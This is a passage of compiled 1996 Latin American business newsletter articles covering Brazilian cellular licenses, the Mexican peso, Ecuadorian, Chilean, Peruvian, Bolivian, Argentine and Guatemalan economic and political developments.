importantly, Embratel, which is a Telebras subsidiary, has refused to sayhow much the fee will be or what equipment will be necessary. Information Gap. "The consortia that are considering bids arefurious with Telebras, because it won't talk about interconnectivity, so theycan't value their bids," Raclin said. Oliveira de Souza complained thatvaluing bids is further complicated by the uncertainty surround ing the futureof A-band cellular providers. Under legislation passed this year, Telebras'subsidiaries still have exclusive concessions to run A-band services. However,they must have their A-band operations up and running within two years andestablish separate divisions, which may join with private capital, to controlthem. The legislation also authorizes their privatization. "There is noprojection as to when they will be privatized," said Oliveira de Souza. "That'san important piece of information we should know before we make our bid." Ten Regional Licenses. The government is expected to divide thecountry into 10 regions and issue one license for each. Although the finaldecision is to be announced on October 28, Oliveira de Souza said it was 95%certain the country would be divided into: Metropolitan Sao Paulo Interior of the state of Sao Paulo Rio de Janeiro and Espirito Santo Minas Gerais Parana and Santa Catarina Rio Grande do Sul Mid West (Goias, Tocantins, Mato Grosso do Sul, Mato Grosso, Rondonia, Acreand the Federal District) North (Amazonas, Roraima, Amapa, Para and Maranhao) Bahia and Sergipe Piaui, Ceara, Rio Grande do Norte, Paraiba, Pernambuco and Alagoas. Oliveiro de Souza argues that some licenses will be virtually worthless. "Someareas don't look viable," he said. For instance, the Amazon region coversalmost half Brazil but generates only 4% of the country's GDP. He estimated thedeployment of B-band cellular services throughout Brazil would cost $5 billion -$7 billion over three years, not including the cost of licenses. Who Will Bid? Thierry Van Nieuwenhove, the First National Bank ofBoston analyst for Brazilian telecom munications, said several majortelecommunications companies, such as NYNEX, Sprint and MCI, would not bidbecause of the problems surrounding B-band licenses. But they are interested ininvesting in A-band operators when they are privatized. Beyond Cellular Networks. Raclin said telecom com panies are lookingbeyond the cellular networks to services where growth will be much faster. Hesaid the ministry of communications goals include a 258% increase in cellularlines to 17.2 million lines by the year 2003. In comparison, the goal for datacommunication services is to increase 544% to 16.1 million users, pay TV is torise 725% to 16.5 million subscribers, paging services are to expand 457% to 3.9million subscribers, and trunking facilities are to increase 700% to 800,000accesses. "Investment – and return on investment – in these othermarket segments is projected to be relatively far greater than in the cellulartelephone sector," Raclin said. "This is what is attracting theattention of entre preneurs in Brazil, not so much the ?great opportunity' tobid somewhere between half a billion and a billion dollars for Sao Paulo." Raclin said companies are particularly interested in "limited service"and "value-added" service. The law governing these services, nicknamedthe "Lei Minima," stipulates that authorization to provide "limitedservice," which is also known as private radio, can be given withoutbidding. Companies typically use "limited service" for internalcommunications, but the law allows for its use by a group of companies withoutdefining how large the group can be. "A number of companies are looking atthis market as a very cheap way of providing cellular service," Raclinsaid. The Internet. "Value-added" service, essentially datacommunication and Internet access, is attracting the attention of largetelecommunications companies. Because the area is unregulated, interconnectionwith existing telecom providers is guaranteed, and equipment costs are minimal.Operators in this area can provide service immediately rather than be delayed6-18 months to invest hundreds of millions of dollars in a cellular system. "Itis a much smaller play, but a return on-investment calculation indicates thebest bets are in data growth and Internet-access growth," Raclin said.

VOL. 13, NO. 21 ISSN 1040-3175 Mexico Peso Debate Flares Up, But Zedillo Not Likely To Devalue Currency US economist Rudiger Dornbusch, once again warning that Mexico is taking amajor risk by not adjusting the peso exchange rate against the dollar, hasechoed a growing number of Mexican politicians and business leaders demanding adevaluation. But President Ernesto Zedillo and key economic authorities do notseem likely any time soon to bow to pressure to abandon the free floatestablished after Mexico's disastrous devaluation nearly two years ago. Exporters Angry. On October 4 , Guanajuato governor Vicente Fox, ofthe conservative opposition National Action Party (PAN), demanded a devaluationat the inaugural ceremony of an industrialists meeting attended by PresidentErnesto Zedillo. Fox, whose family owns several small businesses exportingbroccoli and shoes, said a devaluation is necessary to keep exports attractive.Hector Larios, chairman of the Coordinating Business Council, the country's topumbrella organization of business groups, argued the government should strive tokeep the peso undervalued to keep the economy competitive. President Zedillo responded that his government would keep the peso on afree float, saying it would be risky and inconsistent to go back on the policyestablished only two years ago and instead commit the country to a floating bandor crawling peg system. Indeed, since there is little economic authorities cando to devalue under the current free float, a devaluation would necessarily meanmoving to a more interventionist exchange system, which would deal a seriousblow to investor confidence. On October 4, Ariel Buira, vice governor of the Bank of Mexico, said in NewYork that the central bank has not spent a single dollar to support the peso in1996. The only recorded interventions of the Bank of Mexico in the exchangemarket have been dollar purchases, which would have weakened the peso, to buildup reserves in preparation for the 1997 federal elections. How Strong Is It Really? Studies say exactly the opposite ofexporters. The Private Sector Center for Economic Studies (CEESP), a think tanksupported by the Business Coordinating Council, argues that the peso isundervalued by a negligible 2% against the US dollar. The CEESP uses 1977 as itsbase year. The Bank of Mexico claims the peso is undervalued 41% against abasket of 133 foreign currencies using 1970 as the base year. If the peso is overvalued, this has not yet become apparent in the tradebalance. The country registered a January through August trade surplus of $4.8billion, 6% higher than in the same period of 1995. Imports, how ever, are onceagain growing faster than exports. Although Mexico is still expected to finish1996 with a trade surplus of about $7 billion, this surplus will likely beerased in 1997 unless the peso weakens again. Gross reserves remain remarkably stable. They have fluctuated between $15.4-$16 billion throughout 1996. Most of that money, however is tied to short-termmultilateral loans. Net reserves are said to be about $4 billion, too low tomaintain a more interventionist exchange system. Interest rates, meanwhile, have been falling. One month Treasury bills(Cetes) stood at almost 49% in December 1995. They are now below 23%. Realinterest rates are much lower now than a few months ago. Monetary policy isbecoming more relaxed, exactly the opposite of what one could expect if thecentral bank were propping the peso artificially. The basic monetary indicator,M1, rose 46% year-on-year in August and 41% year-on-year in July. Still, the exchange rate has not weakened. At the end of 1995 the wholesalerate stood at P7.69 to the dollar. By October 9 it was P7.57. This represents a1.5% strengthening of the peso in spite of 20% inflation in the period. Zedillo Defends Stability. President Zedillo's defense of a stablepeso has surprised many observers. In his National Development Plan, made publicin May 1995, his administration argued that the peso should be devaluedgradually in order to maintain a competitive exchange rate. The Bank of Mexicostrongly opposed this position, fighting to maintain the float and arguing thata weak peso would merely generate inflation without promoting growth. The National Development Plan indicated that a floating system would bemaintained in the short term. There are indications, however, that the floatmight be prolonged indefinitely. Although the Bank of Mexico intervened atvarious times in 1995 to stabilize the peso, it did so by injecting very smallamounts of dollars into the market, typically $150 million each time. This isnot enough to make much of a difference in an exchange market involvingtransactions of $4-$5 billion a day. Finance Coming Around? The finance ministry, which in 1995 defendedthe idea of returning the peso to a scheduled gradual devaluation, is apparentlybeginning to accept the Bank of Mexico's position that in an open economy, it isvirtually impossible for the government to manipulate the exchange market forlong. A top finance secretariat official has told Lagniappe that he and hiscolleagues are surprised by the stability of the peso under the present float.Finance ministry agreement is key, since it has veto power over major foreignexchange decisions in the government's exchange commission, which includes threefinance ministry and three central bank officials. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 20 ISSN 1040-3175 Ecuador Populist Theatrics Muddle Promising Signs Of Moderate Policies President Abdala Bucaram's populist leanings emerge in his eccentric publicgestures, like a compact disk record ing and the shaving of his moustache inexchange for a $900,000 donation to a humanitarian foundation. Indica tions fromhis first weeks in office, however, are that he could well follow an economicpath more market- friendly than earlier feared. A series of economic targetshave been set, although not yet backed up with detailed policies. Meanwhile theeconomy remains stable, some of the problems that surged in the oil sector havebeen settled and privatization appears to be going forward. Economy A La Cavallo. An economic plan inspired by former Argentineeconomy minister Domingo Cavallo aims to create 600,000 jobs in four years andbring two million Ecuadorans above the poverty level by the year 2001, doubleaverage per-capita income to $3,200 in ten years and boost economic growth to 6%annually within two years. The plan, which the government presented to the IMFSeptember 24, has met with the approval of business but not of labor, the leftor indigenous groups. Bucaram's economic appointments have helped maintain confidence. AlvaroNoboa as chief of the monetary board, David Goldbaum as top man at the nationalfinance corporation, and Roberto Isaias as chief of the presidential economiccommission (LL 7/19/96) remain market-pleasing appointments. Worries linger,however, over whether rivalries between the Noboa and Isaias business groupswill cause strain within the team. It is also unclear how much influence centralbank president Augusto de la Torre, a respected holdover from the Duran-Ballengovernment, continues to have. Indicators Stay Positive. So far, at least, efforts to portray arational economic front have smoothed out economic indicators. Since Bucaramtook office Aug. 10, interest rates have fallen, the dollar has remained stableand international monetary reserves have risen from $1.45 billion in August toover $1.6 billion now. Labor and business have taken the first steps toward asocial pact. Still, the country is in recession and 1996 inflation is expectedto hit 27%, above the 21% target. Oil Reform. The August brouhaha over Maxus oil operations has dieddown. After the government prohibited Maxus exports and threatened to send themilitary into the YPF subsidiary's oil fields, Maxus agreed to negotiate a newcontract. About to be signed, the new accord would give the state a 29% share ofMaxus crude production. Other oil multinationals (Arco, Occidental Orix, ElfAquitaine and Tripetrol) have also quietly agreed to renegotiate their deals. State oil company Petroecuador, is also about to undergo an overhaul.Operations will be re-centralized. Energy and mines minister Alfredo Adum hasalso announced the planned construction of a new pipeline for heavy crudes, withpublic international bidding possible for the contract. But Adum ran into trouble trying to end gas subsidies, which would haveraised $160 million but returned $40 million to Ecuador's poor via a Christmasbonus. When it became clear the bonus would be logistically unfeasible, Bucaramscotched the whole plan. Privatizations Revived. Privatizations planned by the NationalModernization Council (CONAM) are re putedly still on track despite initialworries that Bucaram would slow them. Operation of Ecuador's four main harborswill be transferred to the private sector, with international bidding expectedby year-end for Guayaquil, early 1997 for Puerto Bolivar and Manta, and laterfor Esmeraldas. The country's main roads will be turned over to the privatesector via concessions averaging 15 years. The privatization of telephoneutility Emetel is expected by April 1997. Bolivia Model For Power? But signs of trouble are evident in theenergy sector. Energy minister Adum has pushed for the sale of 39% of thenational electricity institute to private investors. Bucaram signed the new law,but less than a week later announced he would make the reform more like aBolivia-style "capitaliza tion" in which privatization is accomplishedby bringing in more capital rather than selling an existing stake. No Nonsense. Bucaram has let some of his populist campaign stancesslide. Though he had promised to make one of his first tasks as presidentdismantling a controversial decree allowing monthly fuel price hikes, Bucaramlet the measure stand. He dedicated just 19% of the budget to education thoughhe promised 30%. In late September, Bucaram will inaugurate the first phase of aconstruction plan, some 13,000 houses near Guayaquil, but has not yet guaranteedgovernment financing for the other 187,000 planned. The president has also taken measures to attack a budget deficit estimatedat 2-4% of GDP. A tax compliance program is now in place, with several firmsclosed for evasion and 250 more on a blacklist. Many import duty exemptions willbe suspended. The wild card remains of how the country will settle in to the "junknews" style of an unpredictable president who brags about his music videoand compact disk, who has insulted everyone from former presidents to "unionmafias," "lazy congressmen," and "corrupted indigenousleaders." If he sticks to theatrics on trivial points and leaves economicpolicy to capable advisers, business' worst fears will not be realized. © Copyright 1996 Latin American Information Services, Inc.

Wise investors will also be wary of presidential re- election dreams,which may sidetrack meaningful economic reform in Brazil. Pages 9-10 COPYRIGHT 1996 LATIN AMERICAN INFORMATION SERVICES,INC.

VOL. 13, NO. 19 ISSN 1040-3175 CHILE Endesa's Hydropower Plan Fails Environmental Test, Faces Months of Delay Environmental concerns are slowing another important development project,this time in the electricity sector. The Ralco hydropower plant, Chile's biggestelectricity generation project, has failed to win approval for its environmentalimpact study. As a result, it faces serious delays. Environmental authoritiesare taking a hard line with the project, partly in answer to critics who saythey are nothing more than a rubber stamp. The 580 MW plant, a keystone of powergenerator Endesa's development plan, also faces local opposition. This is thesecond major development in Chile (following plans for an ambitious forestryproject in Tierra del Fuego) to be slowed by environmental issues (LL 8/30/96). Data Deficient. Endesa received the bad news that its environmentalimpact study for Ralco, submitted in March, had been found wanting.Environmental authorities maintain that the assessment does not follow theagreed-upon terms of reference, omits important parts of the project,underestimates the area of impact and does not include a resettlement plan forthe Pehuenche Indians who will lose their homes when the reservoir is filled. Back To The Drawing Board. The ruling means that Endesa must nowundertake a major rewrite of the study and will face a delay of up to a yearbefore the project can be approved. The company hopes to have the plantoperating by 2002. While technically the Ralco plan began before the new rulesrequiring impact studies were imposed, Endesa would still find it difficult tofinance the $460 million project without official approval. The company hasalready touched a nerve by beginning preliminary work on Ralco, even withoutthat approval. Endesa has also upset officials with the same behavior at agas-fired plant project in Santiago. The Ralco plant is particularly important for Endesa as a way to maintainor even increase its current 60% share of the generating market while retainingits identity as a hydro-based company. The company argues that the plant is acompetitive alternative to gas-fired generation, which will make its debut nextyear. Ralco is also a necessary complement to the company's nearly com pleted450 MW Pangue plant, slightly downriver from Ralco's location on the Bio-BioRiver in the south. Local Population Problem. Some 70 Pehuenche Indian families live inthe area to be flooded and all will need to be resettled. They are protected bylegislation that prevents their being moved against their will. So far, theIndians have not accepted the resettlement terms offered by Endesa. Bad For The Economy? Local opponents are more worried about theplant's negative impact on the local economy than its environmental effects.Another region where Endesa has operations is cited as a case in point. Thatarea is estimated to have lost half its population over the last 20 years,despite the existence of three Endesa plants. Ralco itself is expected to create1,600 jobs during the construction phase of the project, but this would drop toless than 50 once operations begin. Wrangling Continues Over Central Bank Post Carlos Massad may still get his chance as president of the central bank (LL7/19/96). Massad, a respected economist, has been caught in the middle of apower play between the government and the congressional opposition over thebroader issue of central bank autonomy. After the senate loudly rejected hisnomination last month, negotiations have continued behind the scenes (LL8/30/96). Stacking The Deck. Each of the three previous appoint ments to thecentral bank have been drawn from the government coalition's own ranks or itssympathizers. Massad, who would have been the fourth, was the last straw for theopposition senate majority, even though the rejecting senators acknowledge thathis qualifications were never in doubt. The government argues that theopposition is motivated by petty political interests. Privately, it has beenforced to admit to its own role in the contretemps and is now trying to patchthings up. Meanwhile Massad is in political limbo, having stepped down as healthminister to be eligible for the central bank appointment. ECONOMY TO SLOW IN 1997 The central bank's annual report on the economy projects the economy willslow slightly in 1997, but maintain solid growth. As tight monetary policies andlower export prices begin to bite, growth is expected to slow from 6.5-7.0% in1996 to 5.5-6.0% next year. Copper Prices Hurt. The bank predicts the trade deficit will widenfrom $600 million this year to $950 million in 1997. The current account gap isprojected to be around 4% of GDP. One important factor is the anticipated dropin the price of copper. The central bank's estimates of an average price of$1.04/lb for this year and $0.95/lb next year are more optimistic than those ofmany market analysts. The bank projects inflation will fall to 5.5% in 1997 from 6.5% this year.This reflects the official goal of bringing Chilean inflation down to that ofindustrial ized countries by 2000. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 18 ISSN 1040-3175 Peru Lavish Offers for Quicay Give New Boost To Thriving Gold Sector The dramatic late July auction of a largely unexplored Central Andean golddeposit has again underlined foreign mining companies' keen interest in stakingclaims to Peru's most attractive sector. And it underscores Peru's meteoric riseas a major gold producer. High Stakes Bidding. Some 13big-name international bidders presented sealed-envelope offers for Quicay, anundeveloped property belonging to state mining giant Centromin. Base price hadbeen set at $5 million. The offers took observers' breath away as Quicay finally fell into the handsof Canada's Barrick Gold with a $202 million shutout bid. Barrick has up to twoyears to decide whether to take up its development option, and pay the sum incash. The runner-up was Inmet Mining, also of Canada, offering $81 million. Fourother companies also bid over $50 million. Latin America's Gold Belt. Thefierce competition reflects the lure of Peruvian gold. The country has been theoutstanding performer in Latin American gold for the past few years and is nowthe second most important producer on the continent (see chart). Output hasrisen five times from around 10 metric tons a year in 1986 to more than 50 tonslast year. By comparison, Chile doubled gold production in the same 10-yearperiod while Mexico and Bolivia both registered an almost three-fold increase.The gold committee of Peru's national mining society predicts that output willrise to 100 tons by the end of the century, probably making Peru the region'slargest gold producer. High Returns. Yanacocha, thejoint venture between Newmont of the US and Peru's Buenaventura, is primarilyresponsible for this stunning growth. In the first five months of this year,Yanacocha produced 36.5% of all Peru's gold, representing 9.4 tons of a nationaltotal of 25.8 tons, up 48% over the same period a year ago. Latin America's Gold Leaders 1986 - 1995 1986 1994 1995 Brazil 67.4 73.4 67.4 Peru 10.9 39.3 51.5 Chile 24.0 43.3 48.5 Colombia 27.1 25.5 24.1 Mexico 8.3 13.9 20.3 Venezuela 15.0 13.7 17.1 Bolivia 6.0 14.7 16.0 Ecuador 6.0 7.6 9.6 Source: Gold Fields Mineral Services, Ltd. The newly won but little explored Quicay is a disseminated depositconsidered similar to Yanacocha, the US-Peruvian joint venture in the provinceof Cajamarca. When it came into production in 1993, it quickly became thelargest and by far the most profitable gold mine in Latin America. This year'soutput was officially projected at 650,000 ounces, though this seems certain tobe exceeded. The Quicay site, near Cerro de Pasco, covers 7,400 hectares and isthought to average some 1.84 grams of gold per metric ton. Deep Pockets. At the sametime as the Quicay bidding, Barrick, North America's largest gold producer, madea surprising $670 million offer for the Vancouver-listed Arequipa Resources,whose main asset is Peru's Pierina gold property. Arequipa Resources, however,seems to be holding out for a counteroffer in view of recent excavation resultsindicating a deposit with 6-7 million ounces and the prospect of 10-12 millionounces. The extravagant Barrick offers could reflect disappointment with its CerroCorono deposit, also in Cajamarca and close to rival Newmont's Yanacocha. TheCanadian company has been drilling for the past couple of years but has not yetmade the decision to go ahead with development. More Gold In The Mountains. Therest of Peru's gold belt is represented by the underground mines of the Patazmining district, 200 miles east of Trujillo along the Maranon river. Way behindthe spectacular Yanacocha but still extremely important, these privately-heldmines are expanding fast and, in some cases, actively seeking risk capital orassociations to fund further exploration. Minera Aurifera Retamas (Marsa), majority-owned by the reclusive AndresMarsano, is now Peru's second largest producer. Last year's output was aroundfour times that of 1990; sales in 1995 reached $41 million. Output for the firstfive months of 1996 soared to 1.5 metric tons, 26% higher than the same periodlast year. The company is reinvesting heavily to expand its camp facilities andinfrastructure. At 1,000 metric tons a day, Marsa's plant is still at only 80%of capacity. Consorcio Horizonte, alongside Marsa in the Pataz gold belt, has alsoquadrupled output since 1990. Production last year reached 2.1 metric tons, up52% from 1994, with sales topping $26 million. Horizonte plans to invest some$15 million to boost output steeply from the current 750 metric tons a day to1,200 by late 1997 according to company officials. Poderosa, owned by the powerful Aria mining group, is the third Pataz mine.Current production is 550 metric tons a day with last year's output reaching 2.5metric tons of fine content. Poderosa is actively seeking risk capital tofinance further expansion. Several potential North American suitors, includingEcho Bay, Sunshine Camber and TVX, have made recent inspection visits. Poderosais also building a small subsidiary plant a couple of hours away. © Copyright 1996 Latin American Information Services, Inc. All RightsReserved.

It is supposed to assure stability and lay the ground work forgrowth. But few in Argentina believe it will do this and Fernandez faces anuphill battle to get support for it. § More cases of blatant corruptionare riveting the public's attention. Page 2 BOLIVIA § The creation of the much-vaunted private pensionsystem that will be financed by privatization assets and private contributionsis on track to make its debut. Congress is discussing the rules that will governthe system and an international search is underway to find two pension fundadministrators with global experience. § The draft rules for the newpension scheme draw from the Chilean model. Page 3 BRAZIL § The government has come up with a bailout plan forthe troubled state banks. The $8 billion package will provide impetus forconsolidations and liquidations and will also give the government a handle on asector that has been both politically and economically troublesome. § Eletrobras is taking steps to deal with expected electricity shortages. § Two power privatizations have been halted pending a corruption investigation. Page 4 CHILE § The upcoming privatization of the Colbun hydrofacility has settled into a six-way race among heavyweight utilities from theUS and Europe. The sale is the last of government's big electricity sell offs. § Carlos Massad, an old hand at central bank duties, will take overleadership of that institution. Page 5 COLOMBIA § President Samper faces a major new headache inthe contentious war on drugs. Now peasant coca growers are demonstrating theiroutrage at crop fumigations, one of the feeble efforts the administration canpoint to as it tries to convince the US to hold off on trade sanctions. § Latest statistics show a slowing economy, growing unemployment and risinginflation. § Banco Bilbao Vizcaya will acquire a 40% stake in BancoGanadero, Colombia's largest bank. Page 6 CUBA § More disheartening news seems in store for Cuba asthe country contemplates an uphill struggle in the face of the Helms-Burtonbill to gather new credits for the next sugar planting. A brand new remodeledoffice building may have difficulty finding tenants and major new hotelinvestment is drying up. § New legislation encouraging companies to setup free zone operations is in place. Page 7 ECUADOR § President Bucaram gave a New York audience arundown of his economic program but failed to assuage doubts that the policieshe embraces – lower interest rates and higher social spending – wouldwork to lift the economy. Bucaram did ally himself to privatization and avoweddeep interest in attracting foreign investment. § The economic programis loaded with goals, some of them contradictory.

Acceleratinggrowth in industry, trade and construction, and an improving profits picture forcompanies support the belief that a revised target of 4% plus growth for thisyear is feasible. § The Bank of Mexico is out buying dollars under aformula designed not to rock the market.

VOL. 13, NO. 17 ISSN 1040-3175 Bolivia Bidders Sought To Launch Private Pension Fund System With capitalization well advanced, the government is moving ahead on itsgoal to create a new pension fund system based on the retained assets of theformer state companies and on private contributions of individual workers.Legislation to regulate the new two-tier system is currently under considerationin congress and efforts are underway to appoint the two pension fund administrators (AFPs) that will share responsibility for man aging the system. Experience Counts. Ernst & Young and Deutsche Morgan Grenfellare the two advisers managing the search for the AFPs. A road show is nowunderway to attract qualified operators and some 39 firms have already expressedinterest. To make it to the short list, bidders must meet the toughqualifications set by the ministry of capitalization. These include 20 years'experience in portfolio management with at least 10 years and $10 billion ininternational/global asset management and 10 years' experience administeringparticipant pension accounts. The international exper ience criteria has beenestablished because Bolivia lacks a capital market, and therefore 50% of thepension fund monies are to be invested overseas. Bids are due by November 20, and the winners will be announced January 1.The two winning bidders will manage an equal split of the capitalizationproceeds, expected to reach $1.4 billion from the anticipated sale of six stateenterprises. So far four properties have been sold, but only the electricholding company ENDE and the telecommunications concern ENTEL have yieldedsignificant amounts – over $800 million. Shares of both companies, whichare being held in trust by Citibank until the new pension scheme is set up, arealready pay ing dividends. The next big privatization is that of oil companyYPFB, now scheduled for September. The AFPs will also manage funds contributedto individual accounts. Chilean Conundrum. Some 21 of the 39 prospective AFP bidders arefrom the US, but stiff competition is expected from Dutch, British, German,Spanish, Japanese, Argentine, Canadian and Chilean firms. The Chileans appear toface somewhat tougher obstacles considering President Sanchez de Lozada's vowthat Chilean AFPs will not be allowed to bid. The president apparently hadsought to avoid the controversy that followed the purchase of the state railwayEmpresa Nacional de Ferrocarriles (ENFE) by the Chilean rail operator CruzBlanca (LL 4/26/96). Mixed Signals. The president later qualified his opposition to theChileans, explaining that none would be able to meet the prequalificationcondition requiring international experience in asset management. However, theminister of capitalization Alfonso Revollo down played the president's comments,saying Chilean investors were welcome to bid for the AFPs and that no one wouldbe excluded. Meanwhile prospective Chilean bidders appear not to be discouraged.The Magister fund, operated by the teachers' union, Provida and Aetna's SantaMaria funds plan to enter alliances with foreign companies that meet biddingterms. Homegrown Team Wants A Place. The Bolivian private sector also hasits beef with the government AFP plan, particularly after the national secretaryfor capitalization Edgar Saravia said international AFP bidders were not obligedto associate with Bolivian interests. Saravia was later contradicted by thenational secretary for pensions Alfonso Penam. Two local con cerns are expectedto make bids. One is a consortium headed by Jose Luis Camacho, president of theConfederacion de Empresarios Privados de Bolivia (CEPB). The group includes 82companies and indiv iduals. The other is headed by Gonzalo Bedoya, president ofBolivia's largest insurance company, La Boliviana Cia. Cruz. Bedoya's groupincludes Banco Nacional, Banco Mercantil and Banco de Santa Cruz. The winning bidders will exclusively manage the pension fund monies for fiveyears, when the market will be opened up to other competitors. While analystscomplain about the lack of competition with just two AFPs, the government saysthis rule is necessary to keep down the costs of establishing a nationalpresence. HIGHLIGHTS OF THE PENSION RULES The draft legislation under which the AFPs will operate is modeled on thesuccessful 15-year-old Chilean system. The new private system will ultimatelyreplace Bolivia's own crippled state program within the next 20 years. Newworkers entering the work force will have to join the private system while thecurrent system will continue to offer pensions at a retirement age of 50 forwomen and 55 for men until the last beneficiary dies. The collective pension scheme based on the capital ization of state assetswill offer a basic pension of $200 a year to an estimated 3.7 million peopleaged 21 and over on December 31, 1995 when they retire at 65. This scheme isalso expected to be phased out, probably around 2055. All the privatized statecompany shares held by the scheme will then be sold on the open market. The individual pension plan will provide retiree, dis ability and survivorbenefits. Enrollment is limited to employees earning over $100 a month and whocan afford the minimum 10% of earnings requirement. Critics say the planunfairly excludes an estimated 1 million peasants and 400,000 urban workers. Butit is unlikely that these workers would be willing to participate anywayconsidering their low wages. Contributions from this group would also create acostly administrative burden. © Copyright 1996 Latin American Information Services, Inc. All RightsReserved.

Deficit reduction is paramount, with more toughspending cuts, possible new taxes and other fiscal reforms expected. It remainsto be seen what kind of political reaction this program sets off. § Ph.D.sfrom Chicago dominate in the new economic lineup. Page 2 BRAZIL § The government's defensive automotive policy isunder heavy fire from domestic and foreign groups that feel it unfairly stacksthe cards against their interests. Some adjustments are likely, although thegovernment would like to keep them small so as not to stir the ire of car makersthat have made huge new production commitments. § Politics have a heavyhand in new favors to micro businesses and pulp and paper makers. § Thetelecommunications opening has been signed into law. Page 3 COLOMBIA § With the threat of US economic sanctions stilllooming large, President Samper has produced a legislative package to crackdown on drug traffic. In toto, it is an unconvincing effort and unlikely to passcongress in time to head off sanctions. § The new approved 1997 budgetaims to cut the deficit sharply.

Thanks to its large population of private companies, Brazil isthe site of particularly hot activity and will become even a greater attractiononce its privatization program builds momentum. But Argentina also offers a highlevel of M&A activity, thanks to provincial privatizations and its hookupwith Brazil in Mercosur. Throughout the region, the financial sector is ripe foran M&A wave.

VOL. 13, NO.16 ISSN 1040-3175 Argentina Cavallo's Replacement Brings Same Broom To the Economy The sudden demise of economy super-minister Domingo Cavallo immediatelyraises the question of "what next for the economy?" The answer quicklyshot back by his replacement, former central bank head Roque Fernandez, is "moreof the same." The market believed the message and reacted with surprisingmildness to the graceful departure of the man who created the convertibilityplan, tamed inflation and pushed free market reform. Now it remains to be seenwhether the message holds and whether Cavallo's ouster by his frequent sparringpartner President Carlos Menem really amounts to no more than a ripple on apond. An early reading of what lies ahead is that legislation may more smoothlypass a congress that had become belligerently hostile to Cavallo. WithFernandez, a Chicago School zealot, unpopular austerity measures will notdisappear. Nor can they, as Argentina's growing deficit leaves little room formaneuver in the economic arena. But for the longer term there is no question thenew minister faces a tough political situation. Menem On The Line. By dismissing Cavallo at such a difficultjuncture for the sluggish economy, the president has put himself in a trickyposition. Menem made the change, so at least in the short-term he owns theresults. Fernandez's prescription for deficit reduction is not likely to bepolitically popular. Yet, it would be disastrous for Menem to try to blockcontroversial changes, thus risking the resignation of his new appointee. No Mr. Nice Guy. Fernandez says he aims to balance the budget andreduce government debt. His first priorities will be to settle on a fiscalreform package with the cooperation of the IMF's Vito Tanzi, and push for laborreform, assisted by labor expert Carla Pacini. Fernandez is considered much moreanti-deficit than Cavallo was and is expected to try harder to press ahead thestate reform, thus cutting expenditures. As an orthodox economist he is alsodisinclined to case-by- case solutions and special arrangements (as, forexample, the one that protects the auto industry). Head On With Labor. Union leaders are not at all happy with the neweconomic leader. Fernandez has confirmed the unpopular benefit cuts recentlyannounced by his predecessor (LL 7/19/96) and is already talking aboutadditional austerity measures. Fernandez also intends to move further towardsthe elimination of the inefficient social services, currently under unioncontrol. It is rumored that part of the labor reform will eliminate dismissalcompensation. Instead, a fund endowed with employers' contributions would takecare of whatever compensation is paid. This approach, which has already beenintroduced to cover workplace accidents, should give companies greaterflexibility and remove one of the deterrents to new hiring. Fuel Tax? Fernandez would also like to tax heating oil and dieselfuel, which is used by an increasing number of cars. At a price one third thatof gasoline, diesel fuel is indeed a tempting target. Congress can be expectedto resist this change, or a change in the rules on how fuel tax revenues aredistributed: 29% for the federal government, 29% for provinces, and the balancefor a housing scheme. Menem has also said there will be no new taxes, but hispronouncements on the economy have to be weighed against his need for Fernandezto succeed. It Had Been Coming. Cavallo's ouster does clear the air. His battleswith Menem were legendary, as were his frequent, theatrical accusations ofcorruption in high places. He had many enemies in influential circles anddiminishing popular support. With unemployment stuck at around 17%, the mostrecent round of austerity measures aimed at cutting the deficit sent hisapproval rating to less than 20%. (Menem's is barely better.) For all his skill and international stature, Cavallo was becoming more of aliability than an asset. It was finally over a minor disagreement – on thereimposition of a tax on interest rates for the benefit of the bank employees'health organization – that Menem asked for Cavallo's resignation. Thepresident immediately offered the post to economists Roberto Aleman and MiguelBroda, but both rejected the advance. Finally Menem appointed Fernandez. WHO'S WHO ON THE ECONOMIC TEAM Roque Fernandez holds a Ph.D. from the University of Chicago, is one of theauthors of the convertibility plan and a founder of the Centro de EstudiosMacroeconomicos (CEMA). Pedro Pou, another Chicago Ph.D., succeeds Fernandez atthe helm of the central bank. Fernandez has moved energetically to put in hisown people, drawing heavily from like- minded members of the central bank board.Pablo Guidotti, who used to work for the IMF and is also a Chicago Ph.D., willbe minister of finance. Eugenio Pendios is leaving the bank superintendency tobe secretary of economic planning. Carlos Rodriguez, chairman of CEMA and also aChicago monetarist, will be the chief of Fernandez's three counselors. The othertwo are Guillermo Calvo, noted for having forecast the Mexican crisis, and CarlaPacini, another Chicago alumna and labor market expert. Industry, commerce andmining will be headed by Alieno Guadagni, former ambassador to Brasilia.Guadagni is labeled a Keynesian, so far the only high level break with theChicago school. A few members of Cavallo's team will remain, such as thesecretary of agriculture and the head of the DEI (Argentina's IRS). © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 15 ISSN 1040-3175 Guatemala Government Pushes Peace, StateReform; Economic Woes Linger The government of Alvaro Arzu is makingheadway on its top political priority of forging a peace accord with theguerrillas (LL 3/1/96). It has signed a framework peace plans and mapped out a$2.3 billion game plan for fulfilling it. And with progress on this front thepresident has launched the process of state modernization. The dark spotsremaining the slow-moving economy and the deficient state of personal security. Promising Peace Talks. The government's negotiating team and thecommanders of the leftist URNG guerrilla are talking their way towards a formalend to Guatemala's 35-year-old armed conflict at an impressive pace. The presentround of negotiations on the role of the military in the post-war era and thedemobilization of the URNG began on June 21. An agreement on these issues isexpected by August, and most analysts believe that a final peace accord will besigned before the year is out. The government of businessman Arzu views progressas urgent because peace is a necessary condition for the modernizing program.The URNG is impatient to take advantage of a less repressive political systemand enter the legal political arena, an attitude reinforced by its militaryweakness. The peace process vaulted forward in early May with the signingof an accord on social, economic and agrarian issues. The agreement sets thetarget of a 50% increase in spending on health and education by 2,000 and sets agrowth goal of 6% p.a. without, however, spelling out how these targets are tobe achieved. A plan for radical changes in the country's notoriously skeweddistribution of land and wealth is absent, and, not surprisingly, groupsrepresenting landless peasants warn that the accord's failure to address whatthey see as a fundamental cause of the armed conflict guarantees thecontinuation of social tension in the post-war era. $2.3 BillionPrice Tag. But the socioeconomic accord has been whole-heartedly welcomed bythe private sector and the international financing organizations. This shouldhelp efforts to raise the funds necessary to implement the peace agreements whenthey formally come into effect. The government planning agency estimates thatthe cost of implementing the accords will be around $2.3 billion; $500 millionfor the socioeconomic accord alone, $953 million for the accords signedpreviously and the remainder for the ones still to be negotiated. FundRaising Plan. Although the government has invited the guerrillas toparticipate in a diplomatic offensive to raise funds, it has retained theinitiative with the formation of a high level commission charged withelaborating a peace 